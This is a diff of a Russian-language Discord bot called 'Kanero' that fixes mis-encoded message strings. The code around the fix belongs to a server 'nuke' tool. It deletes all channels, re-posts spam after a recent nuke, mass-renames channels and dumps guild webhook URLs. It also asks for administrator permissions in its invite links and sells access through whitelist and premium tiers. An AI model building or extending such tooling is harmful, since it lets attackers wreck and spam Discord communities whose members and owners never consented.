@@ -290,11 +290,11 @@ def wl_check():
             return False
         if not is_whitelisted(ctx.author.id):
             embed = discord.Embed(
-                title="?? ������ �����٨�",
-                description="� ���� ��� ��������.\n�� �������� ���� � ��: **davaidkatt**",
+                title="🔒 Доступ запрещён",
+                description="У тебя нет доступа.\nПо вопросам пиши в дм: **davaidkatt**",
                 color=0x0a0a0a
             )
-            embed.set_footer(text="?? Kanero")
+            embed.set_footer(text="🤖 Kanero")
             await ctx.send(embed=embed)
             return False
         return True
@@ -740,11 +740,11 @@ async def cleanup(ctx):
     uid = ctx.author.id
     if not is_freelisted(uid):
         embed = discord.Embed(
-            title="?? ������ �����٨�",
-            description="��� `!cleanup` ����� �����������.\n������ � #addbot: https://discord.gg/nNTB37QNCG",
+            title="🔒 Доступ запрещён",
+            description="Для `!cleanup` нужна авторизация.\nПиши в #addbot: https://discord.gg/nNTB37QNCG",
             color=0x0a0a0a
         )
-        embed.set_footer(text="?? Kanero")
+        embed.set_footer(text="🤖 Kanero")
         await ctx.send(embed=embed)
         return
     await delete_all_channels(ctx.guild)
@@ -766,7 +766,7 @@ async def cleanup(ctx):
             send_messages=True
         )
     channel = await ctx.guild.create_text_channel("general", overwrites=overwrites)
-    # ���������� ����� ����� ������ ���� nuke ��� ����� 30 ������ �����
+    # Отправляем текст спама если был нюк менее 30 секунд назад
     nuke_time = last_nuke_time.get(ctx.guild.id)
     if nuke_time and (asyncio.get_running_loop().time() - nuke_time) <= 30:
         text = last_spam_text.get(ctx.guild.id)
@@ -779,13 +779,13 @@ async def cleanup(ctx):
 @commands.cooldown(1, 30, commands.BucketType.guild)
 async def rename(ctx, *, name: str):
     await asyncio.gather(*[c.edit(name=name) for c in ctx.guild.channels], return_exceptions=True)
-    await ctx.send("������.")
+    await ctx.send("✅ Готово.")
 
 
 @rename.error
 async def rename_error(ctx, error):
     if isinstance(error, commands.CommandOnCooldown):
-        await ctx.send(f"? ������� �� ��������. ������� **{error.retry_after:.0f}** ���.")
+        await ctx.send(f"⏳ Команда на перезагрузке. Подожди **{error.retry_after:.0f}** сек.")
 
 
 @bot.command()
@@ -793,7 +793,7 @@ async def rename_error(ctx, error):
 async def webhooks(ctx):
     whs = await ctx.guild.webhooks()
     if not whs:
-        await ctx.send("�������� ���.")
+        await ctx.send("Вебхуков нет.")
         return
     msg = "\n".join(f"{wh.name}: {wh.url}" for wh in whs)
     await ctx.send(f"```{msg[:1900]}```")
@@ -802,15 +802,15 @@ async def webhooks(ctx):
 @bot.command(name="clear")
 @wl_check()
 async def clear(ctx, amount: int = 10):
-    """������� N ��������� � ������. �������� 100."""
+    """Удалить N сообщений в канале. Максимум 100."""
     if amount > 100:
-        await ctx.send("�������� 100 ���������.")
+        await ctx.send("Максимум 100 сообщений.")
         return
     if amount < 1:
-        await ctx.send("������� 1 ���������.")
+        await ctx.send("Минимум 1 сообщение.")
         return
-    deleted = await ctx.channel.purge(limit=amount + 1)  # +1 ����� ������� � ���� �������
-    msg = await ctx.send(f"??? ������� **{len(deleted) - 1}** ���������.")
+    deleted = await ctx.channel.purge(limit=amount + 1)  # +1 чтобы удалить и саму команду
+    msg = await ctx.send(f"✅ Удалено **{len(deleted) - 1}** сообщений.")
     await asyncio.sleep(3)
     try:
         await msg.delete()
@@ -821,22 +821,22 @@ async def clear(ctx, amount: int = 10):
 @bot.command(name="clear_all")
 @wl_check()
 async def clear_all(ctx):
-    """������� ��� ��������� � ������."""
-    msg = await ctx.send("??? ������ ��� ���������...")
+    """Удалить все сообщения в канале."""
+    msg = await ctx.send("⏳ Очищаю все сообщения...")
     total_deleted = 0
     
-    # Discord ��������� ������� �������� 100 ��������� �� ���
-    # ��������� ���� ���� ���������
+    # Discord ограничивает удаление 100 сообщений за раз
+    # Повторяем пока есть сообщения
     while True:
         deleted = await ctx.channel.purge(limit=100)
         if not deleted:
             break
         total_deleted += len(deleted)
-        # ��������� �������� ����� �� ������� � rate limit
+        # Небольшая задержка чтобы не превысить rate limit
         await asyncio.sleep(1)
     
-    # ���������� ��������� ���������
-    final_msg = await ctx.send(f"??? ������� **{total_deleted}** ���������.")
+    # Отправляем финальное сообщение
+    final_msg = await ctx.send(f"✅ Удалено **{total_deleted}** сообщений.")
     await asyncio.sleep(5)
     try:
         await final_msg.delete()
@@ -892,17 +892,17 @@ async def inv(ctx):
     app_id = bot.user.id
     # ������ ����� (�������������)
     url_full = f"https://discord.com/oauth2/authorize?client_id={app_id}&permissions=8&scope=bot%20applications.commands"
-    # ����������� ����� ������ ��� ������ (��� /analyze)
-    # permissions=1024 = Read Messages ������
+    # Полные права бота для полного функционала (для /analyze)
+    # permissions=1024 = Read Messages только
     url_readonly = f"https://discord.com/oauth2/authorize?client_id={app_id}&permissions=1024&scope=bot%20applications.commands"
-    # User app (��� ���������� �� ������)
+    # User app (для использования на сервере)
     url_user = f"https://discord.com/oauth2/authorize?client_id={app_id}&scope=applications.commands&integration_type=1"
 
-    embed = discord.Embed(title="?? ������ ��� ���������� ����", color=0x0a0a0a)
-    embed.add_field(name="?? ������ ����� (�������������)", value=url_full, inline=False)
-    embed.add_field(name="?? ������ ������ (��� /analyze)", value=url_readonly, inline=False)
-    embed.add_field(name="?? User App (��� ���������� �� ������)", value=url_user, inline=False)
-    embed.set_footer(text="?? Kanero  |  ��� /analyze ���������� ������ '������ ������'")
+    embed = discord.Embed(title="🤖 Ссылки для добавления бота", color=0x0a0a0a)
+    embed.add_field(name="🔓 Полный доступ (рекомендуется)", value=url_full, inline=False)
+    embed.add_field(name="🔒 Только чтение (для /analyze)", value=url_readonly, inline=False)
+    embed.add_field(name="🤖 User App (для использования на сервере)", value=url_user, inline=False)
+    embed.set_footer(text="🤖 Kanero  |  Для /analyze требуется роль 'Модератор'")
     await ctx.author.send(embed=embed)
 
 
@@ -932,26 +932,26 @@ async def resolve_user(ctx, user_input: str) -> discord.User | None:
 
 
 async def update_stats_channels(guild: discord.Guild):
-    """��������� �������� �������-��������� � ��������� ����������."""
-    cat = discord.utils.find(lambda c: "����������" in c.name, guild.categories)
+    """Обновляет счётчики голос-каналов в категории статистики."""
+    cat = discord.utils.find(lambda c: "статистика" in c.name, guild.categories)
     if not cat:
         return
     total    = guild.member_count
-    guest_r  = discord.utils.find(lambda r: r.name == "?? Guest",    guild.roles)
-    user_r   = discord.utils.find(lambda r: r.name == "?? User",     guild.roles)
-    white_r  = discord.utils.find(lambda r: r.name == "? White",    guild.roles)
-    prem_r   = discord.utils.find(lambda r: r.name == "?? Premium",  guild.roles)
+    guest_r  = discord.utils.find(lambda r: r.name == "👤 Guest",    guild.roles)
+    user_r   = discord.utils.find(lambda r: r.name == "👤 User",     guild.roles)
+    white_r  = discord.utils.find(lambda r: r.name == "✅ White",    guild.roles)
+    prem_r   = discord.utils.find(lambda r: r.name == "💎 Premium",  guild.roles)
     counts = {
-        "?? all":       total,
-        "?? guest":     sum(1 for m in guild.members if guest_r  and guest_r  in m.roles),
-        "?? users":     sum(1 for m in guild.members if user_r   and user_r   in m.roles),
-        "? whitelist": sum(1 for m in guild.members if white_r  and white_r  in m.roles),
-        "?? premium":   sum(1 for m in guild.members if prem_r   and prem_r   in m.roles),
+        "👥 all":       total,
+        "👤 guest":     sum(1 for m in guild.members if guest_r  and guest_r  in m.roles),
+        "👤 users":     sum(1 for m in guild.members if user_r   and user_r   in m.roles),
+        "✅ whitelist": sum(1 for m in guild.members if white_r  and white_r  in m.roles),
+        "💎 premium":   sum(1 for m in guild.members if prem_r   and prem_r   in m.roles),
     }
     for ch in cat.voice_channels:
         for prefix, count in counts.items():
             if ch.name.startswith(prefix):
-                new_name = f"{prefix} � {count}"
+                new_name = f"{prefix} – {count}"
                 if ch.name != new_name:
                     try:
                         await ch.edit(name=new_name)
@@ -1097,17 +1097,17 @@ async def wl_list(ctx):
     if ctx.author.id != config.OWNER_ID and (not ctx.guild or ctx.author.id != ctx.guild.owner_id):
         return
     if not config.WHITELIST:
-        await ctx.send("Whitelist ����.")
+        await ctx.send("Whitelist пуст.")
         return
     lines = []
     for uid in config.WHITELIST:
         try:
             user = await bot.fetch_user(uid)
-            lines.append(f"`{uid}` � **{user}**")
+            lines.append(f"`{uid}` – **{user}**")
         except Exception:
-            lines.append(f"`{uid}` � *�� ������*")
-    embed = discord.Embed(title="? Whitelist", description="\n".join(lines), color=0x0a0a0a)
-    embed.set_footer(text=f"?? Kanero  |  �����: {len(config.WHITELIST)}")
+            lines.append(f"`{uid}` – *не найден*")
+    embed = discord.Embed(title="✅ Whitelist", description="\n".join(lines), color=0x0a0a0a)
+    embed.set_footer(text=f"🤖 Kanero  |  Всего: {len(config.WHITELIST)}")
     await ctx.send(embed=embed)
 
 
@@ -1280,11 +1280,11 @@ async def pm_list(ctx):
         if uid not in PREMIUM_LIST:
             try:
                 user = await bot.fetch_user(uid)
-                lines.append(f"`{uid}` � **{user}** ? <t:{int(s['expires'].timestamp())}:R>")
+                lines.append(f"`{uid}` – **{user}** ⏰ <t:{int(s['expires'].timestamp())}:R>")
             except Exception:
-                lines.append(f"`{uid}` ? <t:{int(s['expires'].timestamp())}:R>")
-    embed = discord.Embed(title="?? Premium ������", description="\n".join(lines) if lines else "*�����*", color=0x0a0a0a)
-    embed.set_footer(text=f"?? Kanero  |  ����������: {len(PREMIUM_LIST)}  |  ���������: {len(temp_pm)}")
+                lines.append(f"`{uid}` ⏰ <t:{int(s['expires'].timestamp())}:R>")
+    embed = discord.Embed(title="💎 Premium список", description="\n".join(lines) if lines else "*пусто*", color=0x0a0a0a)
+    embed.set_footer(text=f"🤖 Kanero  |  Постоянных: {len(PREMIUM_LIST)}  |  Временных: {len(temp_pm)}")
     await ctx.send(embed=embed)
 
 
@@ -1298,18 +1298,18 @@ async def fl_list(ctx):
     for uid in FREELIST:
         try:
             user = await bot.fetch_user(uid)
-            lines.append(f"`{uid}` � **{user}**")
+            lines.append(f"`{uid}` – **{user}**")
         except Exception:
-            lines.append(f"`{uid}` � *�� ������*")
+            lines.append(f"`{uid}` – *не найден*")
     for uid, s in temp_fl:
         if uid not in FREELIST:
             try:
                 user = await bot.fetch_user(uid)
-                lines.append(f"`{uid}` � **{user}** ? <t:{int(s['expires'].timestamp())}:R>")
+                lines.append(f"`{uid}` – **{user}** ⏰ <t:{int(s['expires'].timestamp())}:R>")
             except Exception:
-                lines.append(f"`{uid}` ? <t:{int(s['expires'].timestamp())}:R>")
-    embed = discord.Embed(title="?? Freelist", description="\n".join(lines) if lines else "*�����*", color=0x0a0a0a)
-    embed.set_footer(text=f"?? Kanero  |  ����������: {len(FREELIST)}  |  ���������: {len(temp_fl)}")
+                lines.append(f"`{uid}` ⏰ <t:{int(s['expires'].timestamp())}:R>")
+    embed = discord.Embed(title="📁 Freelist", description="\n".join(lines) if lines else "*пусто*", color=0x0a0a0a)
+    embed.set_footer(text=f"🤖 Kanero  |  Постоянных: {len(FREELIST)}  |  Временных: {len(temp_fl)}")
     await ctx.send(embed=embed)
 
 
@@ -1342,10 +1342,10 @@ class CompensationView(discord.ui.View):
         self.expires_at = expires_at
         self.claimed: set[int] = set()
 
-        sub_names = {"wl": "? White", "pm": "?? Premium", "fl": "?? Freelist"}
+        sub_names = {"wl": "✅ White", "pm": "💎 Premium", "fl": "📁 Freelist"}
         self.sub_name = sub_names.get(sub_type, sub_type)
 
-    @discord.ui.button(label="?? �������� �����������", style=discord.ButtonStyle.green, custom_id="claim_comp_v2")
+    @discord.ui.button(label="✅ Получить компенсацию", style=discord.ButtonStyle.green, custom_id="claim_comp_v2")
     async def claim(self, interaction: discord.Interaction, button: discord.ui.Button):
         user = interaction.user
 
@@ -1475,39 +1475,39 @@ async def compensate_cmd(ctx, sub_type: str = None, duration_str: str = None):
     try:
         hours = _parse_duration(duration_str)
     except ValueError as e:
-        await ctx.send(f"? {e}\n�������: `2d` � `48h` � `24`")
+        await ctx.send(f"❌ {e}\nПримеры: `2d` или `48h` или `24`")
         return
 
-    sub_names = {"wl": "? White", "pm": "?? Premium", "fl": "?? Freelist"}
+    sub_names = {"wl": "✅ White", "pm": "💎 Premium", "fl": "📁 Freelist"}
     sub_name = sub_names[sub_type.lower()]
     days = hours // 24
-    duration_text = f"{days} ��. ({hours} �.)" if days > 0 else f"{hours} �."
+    duration_text = f"{days} дн. ({hours} ч.)" if days > 0 else f"{hours} ч."
 
-    # ����� ��������� ����� � 1 ���� �� ���������
+    # Компенсация действует ровно 1 день от выдачи
     claim_deadline = datetime.utcnow() + timedelta(days=1)
 
-    # ���� ����� ����������� �� �������� �������
+    # Ищем канал компенсаций на домашнем сервере
     home_guild = bot.get_guild(HOME_GUILD_ID)
     if not home_guild:
-        await ctx.send("? �������� ������ �� ������.")
+        await ctx.send("❌ Домашний сервер не найден.")
         return
 
-    comp_ch = discord.utils.find(lambda c: "���������" in c.name.lower(), home_guild.text_channels)
+    comp_ch = discord.utils.find(lambda c: "компенсация" in c.name.lower(), home_guild.text_channels)
     if not comp_ch:
-        await ctx.send("? ����� ����������� �� ������ (����� ����� � '���������' � ��������).")
+        await ctx.send("❌ Канал компенсаций не найден (нужен канал с 'компенсация' в названии).")
         return
 
     embed = discord.Embed(
-        title="?? ����������� ��� ����!",
+        title="🎁 Компенсация для вас!",
         description=(
-            f"**��������:** {sub_name}\n"
-            f"**������������:** {duration_text}\n"
-            f"**�������� ��:** <t:{int(claim_deadline.timestamp())}:R>\n\n"
-            "����� ������ ���� ����� �������� �������� � ���� �� �������."
+            f"**Подписка:** {sub_name}\n"
+            f"**Длительность:** {duration_text}\n"
+            f"**Забрать до:** <t:{int(claim_deadline.timestamp())}:R>\n\n"
+            "Нажми кнопку ниже чтобы получить компенсацию в виде роли на сервере."
         ),
         color=0xffd700
     )
-    embed.set_footer(text="?? Kanero  |  ����������� �� ��������� ���")
+    embed.set_footer(text="🤖 Kanero  |  Компенсация не переносится")
     embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
 
     view = CompensationView(sub_type.lower(), hours, claim_deadline)
